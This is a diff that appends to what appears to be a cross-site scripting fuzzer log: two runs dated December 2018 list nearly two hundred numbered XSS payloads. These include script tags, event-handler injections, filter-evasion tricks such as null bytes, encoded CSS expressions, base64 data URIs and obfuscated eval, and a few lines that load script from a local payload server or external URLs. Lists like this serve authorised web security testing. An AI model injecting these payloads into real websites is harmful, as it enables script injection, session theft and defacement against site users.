@@ -38679,3 +38679,443 @@ No: 4806 Data: '><body oninput=alert(1)><input autofocus><div id="1"><svg xmlns=
 No: 4807 Data: "><body oninput=alert(1)><input autofocus><div id="1"><svg xmlns="http://www.w3.org/2000/svg">
 
 No: 4808 Data: '><body oninput=alert(1)><input autofocus><div id="1"><svg xmlns="http://www.w3.org/2000/svg">
+Fuzzer Started at : 2018-12-02 00:54:09.694069
+No: 1 Data: ?''">
+
+No: 2 Data: §><script>alert(※X§)</script>
+
+No: 3 Data: ＊><script>alert(1)</script>
+
+No: 4 Data: "><script>alert(1)</script>
+
+No: 5 Data: '><script>alert(1)</script>
+
+No: 6 Data: ' '><script>alert(1)</script>
+
+No: 7 Data: "><script>alert(1)</script>
+
+No: 8 Data: '><script>alert(1)</script>
+
+No: 9 Data: <script>alert(1)</script>
+
+No: 10 Data: "><script>alert(1)</script>
+
+No: 11 Data: '><script>alert(1)</script>
+
+No: 12 Data: " onerror=alert(1) "
+
+No: 13 Data: " onerror=alert(1) x="
+
+No: 14 Data: -alert(1)-
+
+No: 15 Data: -prompt(1)-
+
+No: 16 Data: <marquee/onstart=confirm(1)>
+
+No: 17 Data: "><marquee/onstart=confirm(1)>
+
+No: 18 Data: '><marquee/onstart=confirm(1)>
+
+No: 19 Data: <img src=x onerror=prompt(1);> 
+
+No: 20 Data: "><img src=x onerror=prompt(1);> 
+
+No: 21 Data: '><img src=x onerror=prompt(1);> 
+
+No: 22 Data: <img src=x onerror=prompt(1)>
+
+No: 23 Data: "><img src=x onerror=prompt(1)>
+
+No: 24 Data: '><img src=x onerror=prompt(1)>
+
+No: 25 Data: '';!--"<X>=&{()}
+
+No: 26 Data: <SCRIPT>+alert("X");</SCRIPT>
+
+No: 27 Data: "><SCRIPT>+alert("X");</SCRIPT>
+
+No: 28 Data: '><SCRIPT>+alert("X");</SCRIPT>
+
+No: 29 Data: <SCRIPT>+alert("X")</SCRIPT>
+
+No: 30 Data: "><SCRIPT>+alert("X")</SCRIPT>
+
+No: 31 Data: '><SCRIPT>+alert("X")</SCRIPT>
+
+No: 32 Data: <script>alert(/X/)</script>
+
+Fuzzer Started at : 2018-12-02 00:54:46.835483
+No: 1 Data: ?''">
+
+No: 2 Data: §><script>alert(※X§)</script>
+
+No: 3 Data: ＊><script>alert(1)</script>
+
+No: 4 Data: "><script>alert(1)</script>
+
+No: 5 Data: '><script>alert(1)</script>
+
+No: 6 Data: ' '><script>alert(1)</script>
+
+No: 7 Data: "><script>alert(1)</script>
+
+No: 8 Data: '><script>alert(1)</script>
+
+No: 9 Data: <script>alert(1)</script>
+
+No: 10 Data: "><script>alert(1)</script>
+
+No: 11 Data: '><script>alert(1)</script>
+
+No: 12 Data: " onerror=alert(1) "
+
+No: 13 Data: " onerror=alert(1) x="
+
+No: 14 Data: -alert(1)-
+
+No: 15 Data: -prompt(1)-
+
+No: 16 Data: <marquee/onstart=confirm(1)>
+
+No: 17 Data: "><marquee/onstart=confirm(1)>
+
+No: 18 Data: '><marquee/onstart=confirm(1)>
+
+No: 19 Data: <img src=x onerror=prompt(1);> 
+
+No: 20 Data: "><img src=x onerror=prompt(1);> 
+
+No: 21 Data: '><img src=x onerror=prompt(1);> 
+
+No: 22 Data: <img src=x onerror=prompt(1)>
+
+No: 23 Data: "><img src=x onerror=prompt(1)>
+
+No: 24 Data: '><img src=x onerror=prompt(1)>
+
+No: 25 Data: '';!--"<X>=&{()}
+
+No: 26 Data: <SCRIPT>+alert("X");</SCRIPT>
+
+No: 27 Data: "><SCRIPT>+alert("X");</SCRIPT>
+
+No: 28 Data: '><SCRIPT>+alert("X");</SCRIPT>
+
+No: 29 Data: <SCRIPT>+alert("X")</SCRIPT>
+
+No: 30 Data: "><SCRIPT>+alert("X")</SCRIPT>
+
+No: 31 Data: '><SCRIPT>+alert("X")</SCRIPT>
+
+No: 32 Data: <script>alert(/X/)</script>
+
+No: 33 Data: "><script>alert(/X/)</script>
+
+No: 34 Data: '><script>alert(/X/)</script>
+
+No: 35 Data: <svg><script>varmyvar="text&quot;;alert(1)//";</script></svg>
+
+No: 36 Data: "><svg><script>varmyvar="text&quot;;alert(1)//";</script></svg>
+
+No: 37 Data: '><svg><script>varmyvar="text&quot;;alert(1)//";</script></svg>
+
+No: 38 Data: <object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>
+
+No: 39 Data: "><object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>
+
+No: 40 Data: '><object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>
+
+No: 41 Data: <math><a xlink:href="//127.0.0.1:3555/xss_serve_payloads/X.js">click
+
+No: 42 Data: "><math><a xlink:href="//127.0.0.1:3555/xss_serve_payloads/X.js">click
+
+No: 43 Data: '><math><a xlink:href="//127.0.0.1:3555/xss_serve_payloads/X.js">click
+
+No: 44 Data: <embed code="http://127.0.0.1:3555/xss_serve_payloads/flash.swf" allowscriptaccess=always>
+
+No: 45 Data: "><embed code="http://127.0.0.1:3555/xss_serve_payloads/flash.swf" allowscriptaccess=always>
+
+No: 46 Data: '><embed code="http://127.0.0.1:3555/xss_serve_payloads/flash.swf" allowscriptaccess=always>
+
+No: 47 Data: <script itworksinallbrowsers>/*<script* */alert(1)</script
+
+No: 48 Data: "><script itworksinallbrowsers>/*<script* */alert(1)</script
+
+No: 49 Data: '><script itworksinallbrowsers>/*<script* */alert(1)</script
+
+No: 50 Data: <img src ?itworksonchrome?\/onerror = alert(1)
+
+No: 51 Data: "><img src ?itworksonchrome?\/onerror = alert(1)
+
+No: 52 Data: '><img src ?itworksonchrome?\/onerror = alert(1)
+
+No: 53 Data: <script crossorigin>alert(1);</script>
+
+No: 54 Data: "><script crossorigin>alert(1);</script>
+
+No: 55 Data: '><script crossorigin>alert(1);</script>
+
+No: 56 Data: <script async>alert(1);</script async>
+
+No: 57 Data: "><script async>alert(1);</script async>
+
+No: 58 Data: '><script async>alert(1);</script async>
+
+No: 59 Data: <script charset>alert(1);</script charset>
+
+No: 60 Data: "><script charset>alert(1);</script charset>
+
+No: 61 Data: '><script charset>alert(1);</script charset>
+
+No: 62 Data: <script a b c >alert(1)</script d e f>
+
+No: 63 Data: "><script a b c >alert(1)</script d e f>
+
+No: 64 Data: '><script a b c >alert(1)</script d e f>
+
+No: 65 Data: <img src=x onerror=document.body.innerHTML=location.hash>#"><img src=x onerror=prompt(1)>
+
+No: 66 Data: "><img src=x onerror=document.body.innerHTML=location.hash>#"><img src=x onerror=prompt(1)>
+
+No: 67 Data: '><img src=x onerror=document.body.innerHTML=location.hash>#"><img src=x onerror=prompt(1)>
+
+No: 68 Data: "><img src=x onerror=prompt(1)>
+
+No: 69 Data: '><img src=x onerror=prompt(1)>
+
+No: 70 Data: <img src=x onerror=document.body.innerHTML=location.hash>#"><img/src='x'onerror=prompt(1)>
+
+No: 71 Data: "><img src=x onerror=document.body.innerHTML=location.hash>#"><img/src='x'onerror=prompt(1)>
+
+No: 72 Data: '><img src=x onerror=document.body.innerHTML=location.hash>#"><img/src='x'onerror=prompt(1)>
+
+No: 73 Data: <img src=x onerror=document.body.innerHTML=location.hash>#<img src=x onerror=prompt(1)>
+
+No: 74 Data: "><img src=x onerror=document.body.innerHTML=location.hash>#<img src=x onerror=prompt(1)>
+
+No: 75 Data: '><img src=x onerror=document.body.innerHTML=location.hash>#<img src=x onerror=prompt(1)>
+
+No: 76 Data: "><img src=x onerror=prompt(1)>
+
+No: 77 Data: '><img src=x onerror=prompt(1)>
+
+No: 78 Data: <img src=x onerror=document.body.innerHTML=location.hash>#<img/src='x'onerror=prompt(1)>
+
+No: 79 Data: "><img src=x onerror=document.body.innerHTML=location.hash>#<img/src='x'onerror=prompt(1)>
+
+No: 80 Data: '><img src=x onerror=document.body.innerHTML=location.hash>#<img/src='x'onerror=prompt(1)>
+
+No: 81 Data: <svg onload=document.body.innerHTML=location.hash>#<img src=x onerror=alert(1)>
+
+No: 82 Data: "><svg onload=document.body.innerHTML=location.hash>#<img src=x onerror=alert(1)>
+
+No: 83 Data: '><svg onload=document.body.innerHTML=location.hash>#<img src=x onerror=alert(1)>
+
+No: 84 Data: <svg onload=document.body.innerHTML=location.hash>#<img src='x'onerror=alert(1)>
+
+No: 85 Data: "><svg onload=document.body.innerHTML=location.hash>#<img src='x'onerror=alert(1)>
+
+No: 86 Data: '><svg onload=document.body.innerHTML=location.hash>#<img src='x'onerror=alert(1)>
+
+No: 87 Data: <svg onload=document.body.innerHTML=location.hash>#<svg onload=prompt(1)>
+
+No: 88 Data: "><svg onload=document.body.innerHTML=location.hash>#<svg onload=prompt(1)>
+
+No: 89 Data: '><svg onload=document.body.innerHTML=location.hash>#<svg onload=prompt(1)>
+
+No: 90 Data: <svg onload=document.body.innerHTML=location.hash>#<svg/onload=prompt(1)>
+
+No: 91 Data: "><svg onload=document.body.innerHTML=location.hash>#<svg/onload=prompt(1)>
+
+No: 92 Data: '><svg onload=document.body.innerHTML=location.hash>#<svg/onload=prompt(1)>
+
+No: 93 Data: --!><svg onload=prompt(1)
+
+No: 94 Data: eval(((_=!1)+{})[1]+(_+{})[2]+(_+{})[4]+((_=!!1)+{})[1]+(_+{})[0]+((_=>(_))+1)[3]+1+((_=>(_))+1)[5])
+
+No: 95 Data: eval((_=!0+(()=>0)+!1)[10]+_[11]+_[3]+_[1]+_[0]+_[4]+1+_[5])
+
+No: 96 Data: <marquee>alert( `X :)`)</marquee>
+
+No: 97 Data: "><marquee>alert( `X :)`)</marquee>
+
+No: 98 Data: '><marquee>alert( `X :)`)</marquee>
+
+No: 99 Data: <"script">"alert(0)"</"script">
+
+No: 100 Data: "><"script">"alert(0)"</"script">
+
+No: 101 Data: '><"script">"alert(0)"</"script">
+
+No: 102 Data: <s[NULL]cript>alert(1)</s[NULL]cript>'>X</a>
+
+No: 103 Data: "><s[NULL]cript>alert(1)</s[NULL]cript>'>X</a>
+
+No: 104 Data: '><s[NULL]cript>alert(1)</s[NULL]cript>'>X</a>
+
+No: 105 Data: <video><source o?UTF-8?Q?n?error="alert(1)">
+
+No: 106 Data: "><video><source o?UTF-8?Q?n?error="alert(1)">
+
+No: 107 Data: '><video><source o?UTF-8?Q?n?error="alert(1)">
+
+No: 108 Data: <body scroll=alert(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
+
+No: 109 Data: "><body scroll=alert(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
+
+No: 110 Data: '><body scroll=alert(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
+
+No: 111 Data: <meta charset="x-mac-farsi">A卹script A取alert(1)//A卹/script A取
+
+No: 112 Data: "><meta charset="x-mac-farsi">A卹script A取alert(1)//A卹/script A取
+
+No: 113 Data: '><meta charset="x-mac-farsi">A卹script A取alert(1)//A卹/script A取
+
+No: 114 Data: <x onload'=alert(1)
+
+No: 115 Data: "><x onload'=alert(1)
+
+No: 116 Data: '><x onload'=alert(1)
+
+No: 117 Data: <sc'+'ript>alert(1)</script>
+
+No: 118 Data: "><sc'+'ript>alert(1)</script>
+
+No: 119 Data: '><sc'+'ript>alert(1)</script>
+
+No: 120 Data: <FRAMESET><FRAME RC=""+"javascript:alert('X');"></FRAMESET>
+
+No: 121 Data: "><FRAMESET><FRAME RC=""+"javascript:alert('X');"></FRAMESET>
+
+No: 122 Data: '><FRAMESET><FRAME RC=""+"javascript:alert('X');"></FRAMESET>
+
+No: 123 Data: </script>"//'//<svg%0Aonload=alert(1)//>
+
+No: 124 Data: "></script>"//'//<svg%0Aonload=alert(1)//>
+
+No: 125 Data: '></script>"//'//<svg%0Aonload=alert(1)//>
+
+No: 126 Data: '//</script><svg%20"%0aonload=alert(1)%20//>
+
+No: 127 Data: </script>'//<svg "%0Aonload=alert(1) //>
+
+No: 128 Data: "></script>'//<svg "%0Aonload=alert(1) //>
+
+No: 129 Data: '></script>'//<svg "%0Aonload=alert(1) //>
+
+No: 130 Data: '//</script><svg "%0Aonload=alert(1)// />
+
+No: 131 Data: </script>"//'//<svg%0Aonload=alert(1) //>
+
+No: 132 Data: "></script>"//'//<svg%0Aonload=alert(1) //>
+
+No: 133 Data: '></script>"//'//<svg%0Aonload=alert(1) //>
+
+No: 134 Data: </script>'//<svg "%0Aonload=alert(1)// />
+
+No: 135 Data: "></script>'//<svg "%0Aonload=alert(1)// />
+
+No: 136 Data: '></script>'//<svg "%0Aonload=alert(1)// />
+
+No: 137 Data: </script "//'//><svg%0Aonload=alert(1)//>
+
+No: 138 Data: "></script "//'//><svg%0Aonload=alert(1)//>
+
+No: 139 Data: '></script "//'//><svg%0Aonload=alert(1)//>
+
+No: 140 Data: ';//</script><svg ";%0Aonload=alert(1)// />#
+
+No: 141 Data: </script><img src '//"%0Aonerror=alert(1)//
+
+No: 142 Data: "></script><img src '//"%0Aonerror=alert(1)//
+
+No: 143 Data: '></script><img src '//"%0Aonerror=alert(1)//
+
+No: 144 Data: </script><svg onload='-/"/-[alert(1)]//'/>
+
+No: 145 Data: "></script><svg onload='-/"/-[alert(1)]//'/>
+
+No: 146 Data: '></script><svg onload='-/"/-[alert(1)]//'/>
+
+No: 147 Data: </script><img '//"%0Aonerror=alert(1)// src>
+
+No: 148 Data: "></script><img '//"%0Aonerror=alert(1)// src>
+
+No: 149 Data: '></script><img '//"%0Aonerror=alert(1)// src>
+
+No: 150 Data: </script><img '//"%0Aonerror=alert(1)// src=1>
+
+No: 151 Data: "></script><img '//"%0Aonerror=alert(1)// src=1>
+
+No: 152 Data: '></script><img '//"%0Aonerror=alert(1)// src=1>
+
+No: 153 Data: </script "/*'/*><svg */; onload=alert(1) //>
+
+No: 154 Data: "></script "/*'/*><svg */; onload=alert(1) //>
+
+No: 155 Data: '></script "/*'/*><svg */; onload=alert(1) //>
+
+No: 156 Data: </script><script>/*"/*'/**/;alert(1)//</script>#
+
+No: 157 Data: "></script><script>/*"/*'/**/;alert(1)//</script>#
+
+No: 158 Data: '></script><script>/*"/*'/**/;alert(1)//</script>#
+
+No: 159 Data: </script "/*'/*><img/src=x */; onerror=alert(1) //
+
+No: 160 Data: "></script "/*'/*><img/src=x */; onerror=alert(1) //
+
+No: 161 Data: '></script "/*'/*><img/src=x */; onerror=alert(1) //
+
+No: 162 Data: </script><script>/*var a="/*""'/**/;alert(1);//</script>
+
+No: 163 Data: "></script><script>/*var a="/*""'/**/;alert(1);//</script>
+
+No: 164 Data: '></script><script>/*var a="/*""'/**/;alert(1);//</script>
+
+No: 165 Data: <iframe src="data:data:javascript:,% 3 c script % 3 e confirm(1) % 3 c/script %3 e">
+
+No: 166 Data: "><iframe src="data:data:javascript:,% 3 c script % 3 e confirm(1) % 3 c/script %3 e">
+
+No: 167 Data: '><iframe src="data:data:javascript:,% 3 c script % 3 e confirm(1) % 3 c/script %3 e">
+
+No: 168 Data: ' style='width:expression(prompt(1));
+
+No: 169 Data: "width:expression(prompt(1))
+
+No: 170 Data: width:\0065\0078\0070\0072\0065\0073\0073\0069\006F\006E\0028\0070\0072\006F\006D\0070\0074\0028\0031\0029\0029
+
+No: 171 Data: javascript:prompt(1)
+
+No: 172 Data: javascript:\u0070rompt&#x28;1&#x29;
+
+No: 173 Data: jAvAsCrIpT&colon;prompt&lpar;1&rpar;
+
+No: 174 Data: http://jsfiddle.net/xboz/c7vvkedv/
+
+No: 175 Data: <EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
+
+No: 176 Data: "><EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
+
+No: 177 Data: '><EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
+
+No: 178 Data: <DIV STYLE="width:\0065\0078\0070\0072\0065\0073\0073\0069\006F\006E\0028\0070\0072\006F\006D\0070\0074\0028\0031\0029\0029">
+
+No: 179 Data: "><DIV STYLE="width:\0065\0078\0070\0072\0065\0073\0073\0069\006F\006E\0028\0070\0072\006F\006D\0070\0074\0028\0031\0029\0029">
+
+No: 180 Data: '><DIV STYLE="width:\0065\0078\0070\0072\0065\0073\0073\0069\006F\006E\0028\0070\0072\006F\006D\0070\0074\0028\0031\0029\0029">
+
+No: 181 Data: data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5wcm9tcHQoMSk8L3NjcmlwdD4=
+
+No: 182 Data: data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAwIiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+cHJvbXB0KDEpOzwvc2NyaXB0Pjwvc3ZnPg==
+
+No: 183 Data: data:text/html;base64,PHNjcmlwdD5wcm9tcHQoMSk8L3NjcmlwdD4=
+
+No: 184 Data: data:text/html;,&#60&#115&#99&#114&#105&#112&#116&#62&#112&#114&#111&#109&#112&#116&#40&#49&#41&#60&#47&#115&#99&#114&#105&#112&#116&#62
+
+No: 185 Data: ``onerror=prompt(1)
+
+No: 186 Data: alert(/XSS/);
+
+No: 187 Data: 1;alert(/XSS/);
+
